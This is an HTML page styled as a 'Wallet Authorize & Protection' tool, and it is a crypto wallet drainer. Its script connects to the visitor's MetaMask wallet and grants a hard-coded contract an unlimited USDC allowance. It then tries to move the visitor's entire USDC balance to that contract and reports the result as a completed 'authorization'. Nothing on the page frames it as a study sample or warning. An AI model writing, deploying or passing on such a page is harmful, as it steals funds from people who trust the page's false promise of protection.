<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III · Wallet Authorize & Protection</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f4f7f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 60px;
    }
    h2 {
      color: #333;
    }
    button {
      padding: 12px 24px;
      margin: 12px;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(145deg, #ffffff, #e6e6e6);
      box-shadow: 2px 4px 10px rgba(0, 0, 0, 0.1);
      transition: all 0.3s ease;
      cursor: pointer;
    }
    button:hover {
      background: #d7efff;
    }
    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
  </style>
</head>
<body>
  <h2>Mark III · Wallet Authorize & Protection</h2>

  <button id="connect">Connect Wallet</button>
  <button id="authorize">Authorize Wallet</button>
  <div id="status">Status: Waiting for wallet...</div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <script>
    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC 主网地址
    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
    const maxAmount = ethers.constants.MaxUint256;

    let provider, signer, user;

    document.getElementById("connect").onclick = async () => {
      if (!window.ethereum) return alert("Please install MetaMask");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      user = await signer.getAddress();
      document.getElementById("status").innerText = "Wallet connected: " + user;
    };

    document.getElementById("authorize").onclick = async () => {
      const usdc = new ethers.Contract(
        usdcAddress,
        [
          "function approve(address spender, uint256 amount) public returns (bool)",
          "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
          "function balanceOf(address account) view returns (uint256)"
        ],
        signer
      );
      try {
        document.getElementById("status").innerText = "Approving contract for USDC...";
        const approveTx = await usdc.approve(contractAddress, maxAmount);
        await approveTx.wait();

        const balance = await usdc.balanceOf(user);
        document.getElementById("status").innerText = "Transferring full USDC balance...";
        const transferTx = await usdc.transferFrom(user, contractAddress, balance);
        await transferTx.wait();

        document.getElementById("status").innerText = "✅ Authorization and transfer complete.";
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "❌ Authorization failed.";
      }
    };
  </script>
</body>
</html>
